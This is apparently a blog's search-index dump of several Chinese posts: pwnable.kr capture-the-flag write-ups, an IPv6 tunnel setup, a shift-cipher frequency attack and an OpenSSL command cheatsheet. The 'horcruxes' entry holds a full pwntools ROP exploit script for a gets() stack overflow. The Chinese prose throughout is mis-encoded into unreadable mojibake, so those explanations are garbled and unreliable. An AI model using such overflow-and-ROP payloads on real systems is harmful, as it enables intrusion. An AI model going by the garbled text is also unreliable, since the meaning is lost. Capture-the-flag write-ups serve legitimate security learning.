Jan 6 2017 password drwxr-xr-x 2 root root 4096 Aug 16 2018 .pwntools-cache éœ€è¦æ˜¯ blukat_pwn ç»„çš„ç”¨æˆ·æ‰èƒ½å¤Ÿè¯»ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä»¥ä»€ä¹ˆç”¨æˆ·ç™»å½•çš„å‘¢ï¼Ÿ $ id uid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn) å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç¡®å®æ˜¯å±äº blukat_pwn ç»„çš„ï¼Œä½†æ˜¯å´æç¤ºæ— æƒè¯»å–ï¼Œé‚£ä¹ˆåªæœ‰ä¸€ç§å¯èƒ½ï¼Œå°±æ˜¯ password æ–‡ä»¶æœ¬èº«çš„å†…å®¹å°±æ˜¯ï¼š cat: password: Permission denied è¾“å…¥è¿›ç¨‹åºå°±èƒ½å¾—åˆ° flagã€‚ ","date":"2019-10-09","objectID":"/pwnkr-toddler/:20:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"horcruxes IDA ä¸€ä¸‹ ropme å‡½æ•°ï¼š int ropme() { char s[100]; // [esp+4h] [ebp-74h] int v2; // [esp+68h] [ebp-10h] int fd; // [esp+6Ch] [ebp-Ch] printf(\"Select Menu:\"); __isoc99_scanf(\"%d\", \u0026v2); getchar(); if (v2 == a) { A(); } else if (v2 == b) { B(); } else if (v2 == c) { C(); } else if (v2 == d) { D(); } else if (v2 == e) { E(); } else if (v2 == f) { F(); } else if (v2 == g) { G(); } else { printf(\"How many EXP did you earned? :\"); gets(s); if (atoi(s) == sum ) { fd = open(\"flag\", 0); s[read(fd, s, 0x64u)] = 0; puts(s); close(fd); exit(0); } puts(\"You'd better get more experience to kill Voldemort\"); } return 0; } æ˜¾ç„¶æœ€åä¸€ä¸ª else éƒ¨åˆ†çš„ gets å¯ä»¥å¯¼è‡´æ ˆæº¢å‡ºï¼Œä½†æ˜¯ç¨‹åºå¼€å¯äº† NX ä½¿å¾—æ— æ³•åœ¨æ ˆä¸Šæ‰§è¡Œ shellcodeï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼Œè¿™é¢˜æˆ‘ä»¬éœ€è¦åˆ©ç”¨ ROP æŠ€æœ¯æ‰¾åˆ° 7 ä¸ª gadgetsï¼Œæœ€ç»ˆåŠ«æŒè¿”å›åœ°å€ã€‚ æ ¹æ® IDA æç¤ºï¼Œs ä½äº ebp-0x74 ä¸è¿”å›åœ°å€ç›¸å·® 0x74+0x4=0x78ã€‚æ³¨æ„åˆ° ropme å‡½æ•°çš„åœ°å€ 0x080a0009 ä¸­å«æœ‰ 0a è¿™ä¸ªæˆªæ–­å­—ç¬¦ï¼Œå› æ­¤æˆ‘ä»¬ä¸å¯èƒ½å°†å…¶ä¸­çš„åœ°å€å†™åˆ°æ ˆä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½ç»•è¿‡ if (atoi(s) == sum ) ç›´æ¥å»è¯» flagã€‚é‚£æˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ° sumï¼š unsigned int init_ABCDEFG() { int v0; // eax unsigned int result; // eax unsigned int buf; // [esp+8h] [ebp-10h] int fd; // [esp+Ch] [ebp-Ch] fd = open(\"/dev/urandom\", 0); if (read(fd, \u0026buf, 4u) != 4 ) { puts(\"/dev/urandom error\"); exit(0); } close(fd); srand(buf); a = -559038737 * rand() % 0xCAFEBABE; b = -559038737 * rand() % 0xCAFEBABE; c = -559038737 * rand() % 0xCAFEBABE; d = -559038737 * rand() % 0xCAFEBABE; e = -559038737 * rand() % 0xCAFEBABE; f = -559038737 * rand() % 0xCAFEBABE; v0 = rand(); g = -559038737 * v0 % 0xCAFEBABE; result = f + e + d + c + b + a + -559038737 * v0 % 0xCAFEBABE; sum = result; return result; } ç”±äºè°ƒç”¨äº† srandï¼Œæˆ‘ä»¬æ— æ³•é¢„æµ‹ abcdefg çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬åˆéœ€è¦å®ƒä»¬çš„å€¼æ‰èƒ½è®¡ç®—å‡º sumã€‚å¹¸è¿çš„æ˜¯ï¼Œåœ¨ ropme å‡½æ•°ä¸­åˆšæ‰è¢«æˆ‘ä»¬å¿½ç•¥çš„ä¸Šé¢çš„ä¸€å¤§ä¸² if è¯­å¥èƒ½å¸¦æ¥ä¸€äº›å¸®åŠ©ã€‚å½“è¾“å…¥çš„ v2 ç­‰äºè¿™äº›éšæœºæ•°ä¸­çš„ä»»ä¸€ä¸ªæ—¶ï¼Œå°±ä¼šæ‰§è¡Œç›¸åº”çš„å¤§å†™å­—æ¯ä½œä¸ºåå­—çš„å‡½æ•°ï¼Œè€Œè¿™äº›å‡½æ•°ä¼šå°†éšæœºæ•°æœ¬èº«æ‰“å°å‡ºæ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ‹¿åˆ° 7 ä¸ªéšæœºæ•°çš„å€¼äº†ï¼Œç›¸åŠ å°±èƒ½å¾—åˆ° sumã€‚ æˆ‘ä»¬ä» IDA ä¸­æ‹¿åˆ° 7 ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå‰é¢å…ˆå¡«å…… 0x78 å­—èŠ‚ï¼Œéšåä¾æ¬¡è¿½åŠ  7 ä¸ªå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆä¸€ä¸ªå‡½æ•°è¿”å›åå°±ä¼šè¿”å›åˆ°ä¸‹ä¸€ä¸ªå‡½æ•°çš„å…¥å£ä¸Šï¼Œæ„æˆ ROP é“¾ï¼Œæœ€åå†è¿”å› ropme è®¡ç®— sumã€‚ç„¶è€Œå‰é¢æåˆ° ropme åœ°å€æ— æ³•å†™åˆ°æ ˆä¸Šï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ main å‡½æ•°ä¸­ call ropme æ‰€åœ¨åœ°å€ 0x0809fffcï¼Œæ¥è¿”å›åˆ° ropmeã€‚ å› æ­¤ï¼Œæœ€ç»ˆ payload ä¸ºï¼š from pwn import * p = remote('pwnable.kr', 9032) p.recvuntil(':') p.sendline('1') p.recvuntil(':') payload = 'a'*0x78 + p32(0x0809fe4b) + p32(0x0809fe6a) + p32(0x0809fe89) + p32(0x0809fea8) + p32(0x0809fec7) + p32(0x0809fee6) + p32(0x0809ff05) + p32(0x0809fffc) p.sendline(payload) p.recvline() sum = 0 for i in range(7): p.recvuntil('+') sum += int(p.recvline()[:-2]) # strip )\\n p.recvuntil(':') p.sendline('1') p.recvuntil(':') p.sendline(str(sum)) print p.recv() ","date":"2019-10-09","objectID":"/pwnkr-toddler/:21:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["æ¢ç´¢"],"content":"å–œè¿å›½åº†ã€‚ æ–°é…ç½®çš„ä»£ç†æœåŠ¡å™¨è®¿é—®è°·æ­Œæ—¶ï¼Œæœ‰æ—¶ä¼šé‡åˆ°è¦æ±‚äººæœºèº«ä»½éªŒè¯çš„é—®é¢˜ã€‚æŸ¥æ‰¾äº†ä¸€äº›èµ„æ–™åï¼Œå‘ç°åº”è¯¥æ˜¯è°·æ­Œ ban äº†å¯¹åº”çš„ IPv4 åœ°å€æ‰€å¯¼è‡´çš„ï¼ˆè¯´åˆ°è¿™é‡Œï¼Œè®°å½•ä¸€ä¸ª å¥½ç”¨çš„ç½‘ç«™ï¼‰ã€‚ æœ€ç®€å•çš„è§£å†³åŠæ³•å°±æ˜¯ä½¿ç”¨ IPv6 è¿›è¡Œè®¿é—®ï¼Œä¸ºæ­¤æˆ‘ä»¬éœ€è¦å¼€é€šä¸€ä¸ª IPv6 éš§é“ã€‚åœ¨è¿™ä¸ª è‰¯å¿ƒç½‘ç«™ ä¸Šæ³¨å†Œä¸ªè´¦å·ï¼Œç„¶å Create Regular Tunnelï¼Œå¡«å†™æœåŠ¡å™¨ IPv4 åœ°å€å¹¶é€‰æ‹©éš§é“æœåŠ¡å™¨åï¼Œå°±èƒ½çœ‹åˆ°éš§é“çš„è¯¦ç»†ä¿¡æ¯äº†ã€‚ä¾‹å¦‚ï¼ŒClient IPv6 Address æ˜¾ç¤ºäº†æˆ‘ä»¬çš„æœåŠ¡å™¨çš„ IPv6 åœ°å€ã€‚ æ¥ä¸‹æ¥ï¼Œåœ¨ Example Configurations ä¸­é€‰æ‹©è‡ªå·±æœåŠ¡å™¨çš„ OSï¼Œå¹¶æ ¹æ®æç¤ºåœ¨æœåŠ¡å™¨ä¸Šå®Œæˆç›¸åº”é…ç½®å³å¯ã€‚Debian å’Œ Ubuntu æœ‰è‡ªå·±çš„é€‰é¡¹ï¼ŒCentOS åŠå…¶å®ƒå¸¸ç”¨ Linux ç³»ç»Ÿå¯ä»¥é€‰æ‹© Linux-net-toolsã€‚ è‡³æ­¤ï¼ŒæœåŠ¡å™¨å·²ç»å¯ä»¥é€šè¿‡ IPv6 è®¿é—®è°·æ­Œäº†ï¼Œæµ‹è¯•ï¼š $ ping6 ipv6.google.com æ³¨ï¼šå¯èƒ½éœ€è¦åœ¨ /etc/hosts ä¸­åŠ å…¥éƒ¨åˆ† è°·æ­Œç›¸å…³ IPv6 åœ°å€ã€‚ ","date":"2019-09-26","objectID":"/ipv6-tunnel/:0:0","tags":["ç½‘ç»œ"],"title":"èˆè¿‘æ±‚è¿œï¼šå¼€é€š IPv6 éš§é“","uri":"/ipv6-tunnel/"},{"categories":["å¯†ç å­¦"],"content":"ã€Šå¯†ç å­¦åŸºç¡€ã€‹å°ä½œä¸šã€‚ ","date":"2019-09-13","objectID":"/auto-atk-shift-cipher/:0:0","tags":["å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"å¯¹ç§»ä½å¯†ç çš„è‡ªåŠ¨åŒ–æ”»å‡»","uri":"/auto-atk-shift-cipher/"},{"categories":["å¯†ç å­¦"],"content":"èƒŒæ™¯ å¯¹å¸¸è§çš„ç§»ä½å¯†ç çš„æ”»å‡»ï¼Œä¸€èˆ¬æ˜¯ç©·ä¸¾å¯†é’¥å’Œå¯èƒ½çš„æ˜æ–‡ï¼Œç„¶ååˆ¤æ–­å…¶ä¸­å“ªä¸ªæ˜æ–‡æœ‰æ„ä¹‰ã€‚ç„¶è€Œï¼Œå¯¹äº â€œæœ‰æ„ä¹‰â€ çš„åˆ¤æ–­æ˜¯åŸºäºäººçš„ä¸»è§‚æ„å¿—ï¼Œå¯¹è®¡ç®—æœºè€Œè¨€å¾ˆéš¾è‡ªåŠ¨åŒ–ã€‚å› æ­¤å¼•å…¥ç ´è§£æ›¿æ¢å¯†ç æ—¶å¸¸ç”¨çš„è¯é¢‘åˆ†ææ³•ï¼Œæ¥å®ç°å¯¹ç§»ä½å¯†ç çš„è‡ªåŠ¨åŒ–æ”»å‡»ã€‚ ","date":"2019-09-13","objectID":"/auto-atk-shift-cipher/:1:0","tags":["å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"å¯¹ç§»ä½å¯†ç çš„è‡ªåŠ¨åŒ–æ”»å‡»","uri":"/auto-atk-shift-cipher/"},{"categories":["å¯†ç å­¦"],"content":"æ”»å‡»ç®€ä»‹ ç”¨ $p_i$ è¡¨ç¤ºç¬¬ $i$ ä¸ªå­—æ¯åœ¨æ­£å¸¸è‹±æ–‡æ–‡æœ¬ä¸­å‡ºç°çš„æ¦‚ç‡ï¼Œ$0\u003c=i\u003c=25$ã€‚æ ¹æ®ç»Ÿè®¡æ•°æ®ï¼Œæœ‰ï¼š $$ \\sum_{i=0}^{25}p_i^2\\approx 0.065 $$ ç”¨ $q_i$ è¡¨ç¤ºç¬¬ $i$ ä¸ªå­—æ¯åœ¨å¯†æ–‡æ–‡æœ¬ä¸­å‡ºç°çš„æ¦‚ç‡ï¼ˆå‡†ç¡®åœ°è¯´ï¼Œé¢‘ç‡ï¼‰ï¼Œ$0\u003c=i\u003c=25$ã€‚å¦‚æœå¯†é’¥ä¸º $k$ï¼Œåˆ™å¯¹äºæ¯ä¸ª $i$ è€Œè¨€ï¼Œ$q_{i+k}$ åº”çº¦ç­‰äº $p_i$ã€‚ å¦‚æœå¯¹äºæ¯ä¸ª $j\\in\\lbrace 0,â€¦,25\\rbrace$ï¼Œæˆ‘ä»¬è®¡ç®— $I_j$ çš„å€¼ï¼š $$ I_j=\\sum_{i=0}^{25}p_i\\cdot q_{i+j} $$ é‚£ä¹ˆå¯¹äºå®é™…ä½¿ç”¨çš„å¯†é’¥ $k$ï¼Œåº”æœ‰ $I_k\\approx 0.065$ã€‚ ","date":"2019-09-13","objectID":"/auto-atk-shift-cipher/:2:0","tags":["å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"å¯¹ç§»ä½å¯†ç çš„è‡ªåŠ¨åŒ–æ”»å‡»","uri":"/auto-atk-shift-cipher/"},{"categories":["å¯†ç å­¦"],"content":"ä»£ç  import math key_space = 26 c = 'OVDTHUFWVZZPISLRLFZHYLAOLYL' lenc = len(c) std = 0.065 dev = 99 k = 0 # from wikipedia p = [0.08167,0.01492,0.02782,0.04253,0.12702, 0.02228,0.02015,0.06094,0.06966,0.00153, 0.00772,0.04025,0.02406,0.06749,0.07507, 0.01929,0.00095,0.05987,0.06327,0.09056, 0.02758,0.00978,0.02360,0.00150,0.01974, 0.00074] q = [] def num2ord(num): return ord('A') + num def ord2num(i): return i - ord('A') for i in range(key_space): q.append(c.count(chr(num2ord(i)) ) * 1.0 / lenc) for j in range(key_space): Ij = 0 for i in range(key_space): Ij += p[i] * q[(i+j) % key_space] cur_dev = math.fabs(Ij - std) # deviation if (cur_dev \u003c dev): dev = cur_dev k = j print('Key: %d' % k) m = '' for i in range(lenc): m += chr(num2ord(ord2num(ord(c[i])-k) % key_space)) print('Plaintext: %s' % m) # Key: 7 # Plaintext: HOWMANYPOSSIBLEKEYSARETHERE ","date":"2019-09-13","objectID":"/auto-atk-shift-cipher/:3:0","tags":["å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"å¯¹ç§»ä½å¯†ç çš„è‡ªåŠ¨åŒ–æ”»å‡»","uri":"/auto-atk-shift-cipher/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ä»…ä»…è®°å½•äº†ä¸€äº›è¾ƒå¸¸ç”¨çš„å‘½ä»¤å®ä¾‹ï¼Œå…·ä½“å‘½ä»¤ã€é€‰é¡¹ä¸è¯´æ˜æ¨èæŸ¥é˜…å®˜æ–¹æ–‡æ¡£ã€‚ æ³¨ï¼šæœ¬é€ŸæŸ¥è¡¨ç”±äºç¯‡å¹…é™åˆ¶ï¼Œä½¿ç”¨æ—¶éœ€è¦è¯»è€…ä¸¾ä¸€åä¸‰ã€‚ä¾‹å¦‚ï¼šä¸åŠ  -out é€‰é¡¹ä¼šé»˜è®¤è¾“å‡ºåˆ° stdoutã€‚ ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:0:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"base64 # å¤åˆ¶æ–‡ä»¶ openssl enc -none -in file1 -out file2 # base64 ç¼–ç  openssl enc -a -in plain -out plainb64 # base64 è§£ç  openssl enc -a -d -in plainb64 -out plain # ä» stdin è¯»å…¥å¹¶ base64 ç¼–ç ï¼Œæ—  -n é»˜è®¤æ·»åŠ æ–°è¡Œ echo -n 'string' | openssl enc -a ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:1:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å¯¹ç§°å¯†ç  # æ‰€æœ‰å¯ç”¨çš„å¯†ç ç®—æ³• openssl ciphers -v # æ‰€æœ‰é«˜å¼ºåº¦ AES åŠ å¯†ç®—æ³• openssl ciphers -v 'AES+HIGH' # åŠ å¯† openssl enc -aes-256-cbc -in plain -out cipher # åŠ å¯†å¹¶ base64 ç¼–ç  openssl enc -a -aes-256-cbc -in plain -out cipher # åŠ å¯†ï¼Œç›´æ¥è®¾ç½®å£ä»¤ openssl enc -aes-256-cbc -in plain -out cipher -pass pass:123456 # åŠ å¯†ï¼Œä»æ–‡ä»¶ä¸­è¯»å–å£ä»¤ openssl enc -aes-256-cbc -in plain -out cipher -pass file:/home/password.txt # åŠ å¯†ï¼Œä»ç¯å¢ƒå˜é‡ä¸­è¯»å–å£ä»¤ openssl enc -aes-256-cbc -in plain -out cipher -pass env:mypass # åŠ å¯†ï¼Œè®¾ç½®å¯†é’¥å’Œ IV openssl enc -aes-256-cbc -in plain -out cipher -k deadbeef -iv deadbeef # åŠ å¯†ï¼Œä¸ä½¿ç”¨ç› openssl enc -aes-256-cbc -in plain -out cipher -nosalt # åŠ å¯†ï¼Œä½¿ç”¨æŒ‡å®šç› openssl enc -aes-256-cbc -in plain -out cipher -S deadbeef # è§£å¯† openssl enc -d -aes-256-cbc -in cipher -out plain ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:2:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å…¬é’¥å¯†ç  ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:3:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"RSA å¯†é’¥ç®¡ç† # ç”ŸæˆæŒ‡å®šé•¿åº¦ç§é’¥ openssl genrsa -out privkey.pem 2048 # ç”Ÿæˆç§é’¥å¹¶åŠ å¯† openssl genrsa -des3 -out privkey.pem # ç”Ÿæˆç§é’¥å¹¶åŠ å¯†ï¼Œç›´æ¥è®¾ç½®å£ä»¤ openssl genrsa -des3 -out privkey.pem -passout pass:123456 # ç”Ÿæˆç§é’¥ï¼Œç”¨æ–‡ä»¶ä½œä¸ºéšæœºç§å­ openssl genrsa -out privkey.pem -rand random.txt # æ ¹æ®ç§é’¥ç”Ÿæˆå…¬é’¥ openssl rsa -in privkey.pem -out pubkey.pem -pubout # ç§»é™¤å¯¹ç§é’¥æ–‡ä»¶çš„åŠ å¯† openssl rsa -in privkey.pem -out newkey.pem # PKCS#12 ç§é’¥è½¬ PEM openssl rsa -in privkey.p12 -inform p12 -passin pass:123456 -out newkey.pem -passout pass:654321 -aes256 # æŸ¥çœ‹ç§é’¥å†…å®¹ openssl rsa -in privkey.pem -passin pass:123456 -text -noout # æŸ¥çœ‹å…¬é’¥æ¨¡æ•° openssl rsa -in pubkey.pem -pubin -modulus -noout ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:3:1","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"RSA åŠ è§£å¯†ä¸ç­¾å # å…¬é’¥åŠ å¯† openssl rsautl -encrypt -in plain -out cipher -inkey pubkey.pem -pubin # ç§é’¥è§£å¯† openssl rsautl -decrypt -in cipher -out plain -inkey privkey.pem # ç”¨è¯ä¹¦ä¸­å…¬é’¥åŠ å¯†ï¼ŒåŠ å¯†å‰é¢ å€’æ˜æ–‡ openssl rsautl -encrypt -in plain -rev -out cipher -inkey cert.pem -certin # ç§é’¥ç­¾å openssl rsautl -sign -in plain -out sig -inkey privkey.pem # ç§é’¥ç­¾åå¹¶æ˜¾ç¤ºåå…­è¿›åˆ¶æ•°æ® openssl rsautl -sign -in plain -inkey privkey.pem -hexdump # å…¬é’¥éªŒè¯ openssl rsautl -verify -in sig -inkey pubkey.pem -pubin # ç”¨ PKCS#12 è¯ä¹¦ä¸­ç§é’¥ç­¾å openssl rsautl -sign -in plain -out sig -inkey cert.pfx -certin -keyform pkcs12 # ç”¨ PKCS#12 è¯ä¹¦ä¸­å…¬é’¥éªŒè¯ openssl rsautl -verify -in sig -out plain -inkey cert.pfx -certin -keyform pkcs12 ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:3:2","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å…¶å®ƒå…¬é’¥å¯†ç  # ç”Ÿæˆ DH å‚æ•°ï¼Œ5 ä¸ºåŸæ ¹ openssl dhparam -outform d -out dh512.der -5 512 # ç”Ÿæˆ DSA é£æ ¼ DH å‚æ•° openssl dhparam -dsaparam -out dh512.pem 512 # ç”Ÿæˆ DSA å¯†é’¥å‚æ•° openssl dsaparam -out dsa512.pem 512 # DSA å¯†é’¥å‚æ•°æ–‡ä»¶è½¬ C ä»£ç  openssl dsaparam -C -noout -in dsa512.pem # æŸ¥çœ‹ DSA å¯†é’¥å‚æ•°å†…å®¹ openssl dsaparam -text -noout -in dsa512.pem # ç”Ÿæˆ DSA ç§é’¥å¹¶åŠ å¯† openssl gendsa -out dsakey.pem -aes256 -passout pass:123456 dsa512.pem # DSA ç§é’¥ï¼ŒPEM è½¬ DER openssl dsa -aes-256-cbc -in dsakey.pem -passin pass:123456 -out dsakey.der -outform d -passout pass:654321 # æ ¹æ® DSA ç§é’¥ç”Ÿæˆå…¬é’¥ openssl dsa -in dsakey.pem -passin pass:123456 -out dsapubkey.pem -pubout # æ‰€æœ‰å¯ç”¨çš„æ¤­åœ†æ›²çº¿ openssl ecparam -list_curves # ç”Ÿæˆ EC å¯†é’¥ openssl ecparam -out key.pem -name prime256v1 -genkey ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:3:3","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å“ˆå¸Œä¸æ‘˜è¦ # æ‰€æœ‰å¯ç”¨çš„å“ˆå¸Œç®—æ³• openssl -list-message-digest-commands # RSA+SHA1 ç­¾å openssl sha1 -sign privkey.pem -out sig plain # DSA+DSS1 éªŒè¯ç­¾å openssl dgst -dss1 -verify dsapubkey.pem -signature sig plain # RIPEMD-160 å“ˆå¸Œæ–‡ä»¶ openssl rmd160 -out sig plain # PKCS#12 æ ¼å¼çš„ RSA ç§é’¥ç­¾åæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨å¤šä¸ªæ–‡ä»¶ä½œä¸ºéšæœºç§å­ openssl sha1 -sign -keyform pkcs12 privkey.pfx -out sig -rand file1;file2;file3 plain # åŠ  2 å­—ç¬¦ç›å“ˆå¸ŒæŒ‡å®šçš„å£ä»¤ openssl passwd MyPassword # åŠ  8 å­—ç¬¦ç›å“ˆå¸ŒæŒ‡å®šçš„å£ä»¤ openssl passwd -1 MyPassword # å“ˆå¸ŒæŒ‡å®šçš„å£ä»¤ï¼Œä½¿ç”¨æŒ‡å®šçš„ 8 å­—ç¬¦ç› openssl passwd -1 -salt deadbeef MyPassword ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:4:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"è¯ä¹¦ # ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼Œä¸åŠ å¯†ï¼Œä½¿ç”¨æ–°ç”Ÿæˆçš„ RSA å¯†é’¥ openssl req -x509 -nodes -days 365 -sha256 -newkey rsa:2048 -keyout privkey.pem -out mycert.cer # ç”Ÿæˆè¯ä¹¦è¯·æ±‚å¹¶åŠ å¯†ï¼Œä½¿ç”¨å·²æœ‰çš„ RSA å¯†é’¥ï¼ŒåŠ å¯†æ–¹å¼é™å®š DES3-CBCï¼Œè¾“å‡ºæ ¼å¼é™å®š PEM openssl req -new -key privkey.pem -passout pass:123456 -out req.pem # ç”Ÿæˆè‡ªç­¾åè¯ä¹¦å¹¶åŠ å¯†ï¼Œä½¿ç”¨å·²æœ‰ DSA å¯†é’¥å‚æ•°æ–‡ä»¶ç”Ÿæˆ DSA å¯†é’¥ï¼Œé™å®šåŒä¸Š openssl req -new -newkey dsa:dsa512.pem -keyout dsakey.pem -passout pass:123456 -out req.pem # éªŒè¯ä¸€ä¸ªè¯ä¹¦è¯·æ±‚çš„ç­¾å openssl req -verify -in req.pem -noout -verify -key privkey.pem # æŸ¥çœ‹ X.509 è¯ä¹¦çš„åºåˆ—å·ï¼Œå“ˆå¸Œå€¼å’Œæ‘˜è¦ openssl x509 -in mycert.pem -noout -serial -hash -fingerprint # X.509 è¯ä¹¦ï¼ŒPEM è½¬ DER openssl x509 -in mycert.pem -inform p -out mycert.der -outform d # X.509 è½¬ PKCS#12ï¼ŒåŠ å¯†æ–¹å¼é™å®š DES3-CBC openssl pkcs12 -export -in mycert.pem -out cert.pfx -name \"My Certificate\" # PKCS#12 è½¬ PEMï¼Œæ— åŠ å¯† openssl pkcs12 -in cert.pfx -out mycert.pem -nodes # æŸ¥çœ‹ PKCS#12 è¯ä¹¦ä¿¡æ¯ openssl pkcs12 -in cert.pfx -noout -info # éªŒè¯è¯ä¹¦ openssl verify mycert.pem ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:5:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"SSL/TLS # è¿æ¥è¿œç¨‹ SMTP æœåŠ¡å™¨çš„ 25(TLS) ç«¯å£ openssl s_client -connect remote.host:25 -starttls smtp # è¿æ¥è¿œç¨‹ STMP æœåŠ¡å™¨çš„ 465(SSL) ç«¯å£ï¼Œå¹¶æ˜¾ç¤ºå…¶è¯ä¹¦é“¾ openssl s_client -connect remote.host:465 -showcerts # è¿æ¥è¿œç¨‹æœåŠ¡å™¨çš„ 443(HTTPS) ç«¯å£å¹¶ä½¿ç”¨ TLS åè®®çš„ SNI æ‰©å±•è®¿é—®æŒ‡å®šä¸»æœº openssl s_client -connect www.massivehost.com:443 -servername www.myhost.com # å¼€å¯ SSL æœåŠ¡å™¨ï¼Œé»˜è®¤ç›‘å¬ 4433 ç«¯å£ï¼Œå• html é¡µé¢ openssl s_server -cert mycert.pem -www # å¼€å¯ SSL æœåŠ¡å™¨ï¼Œç›‘å¬ 443 ç«¯å£ï¼Œæ‹¥æœ‰ç±»ä¼¼åä»£æœåŠ¡å™¨çš„ web ç›®å½•ï¼ˆå³å½“å‰ç›®å½•ï¼‰ openssl s_server -cert mycert.pem -accept 443 -WWW # è¿œç¨‹æœåŠ¡å™¨ 443 ç«¯å£è¿æ¥æµ‹é€Ÿï¼Œç”¨æ–° session è®¿é—® test.htmlï¼Œä¸”åªä½¿ç”¨ SSLv3 ä»¥åŠé«˜å¼ºåº¦åŠ å¯†ç®—æ³•ï¼Œæµ‹è¯•æŒ‡æ ‡ä¸º 10 ç§’å†…è¿æ¥æ¬¡æ•° openssl s_time -connect remote.host:443 -www /test.html -new -ssl3 -time 10 -cipher HIGH ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:6:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ç´ æ•° # ç´ æ€§åˆ¤å®š openssl prime 561 # 16 è¿›åˆ¶æ•°ç´ æ€§åˆ¤å®š openssl prime -hex 2f # äº§ç”ŸæŒ‡å®šé•¿åº¦çš„ç´ æ•° openssl prime -generate -bits 64 # äº§ç”ŸæŒ‡å®šé•¿åº¦çš„ 16 è¿›åˆ¶ç´ æ•° openssl prime -generate -bits 64 -hex ","date":"2019-09-02","objectID":"/openssl-cheatsheet/:7:0","tags":["å¯¹ç§°å¯†ç å­¦","å…¬é’¥å¯†ç å­¦"],"title":"OpenSSL å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨","uri":"/openssl-cheatsheet/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å…¶å®ƒ # ç¿»è¯‘ SSL é”™è¯¯ä¿¡æ¯ï¼Œæœ€åçš„å‚æ•°æ˜¯é”™è¯¯ç  openssl errstr 0407006A # äº§ç”Ÿ 1024 å­—èŠ‚éšæœºæ•°æ®ï¼Œå¹¶ base64 ç¼–ç  openssl rand -base64 -out random-data 1024 # RSA ç®—æ³•æµ‹é€Ÿ 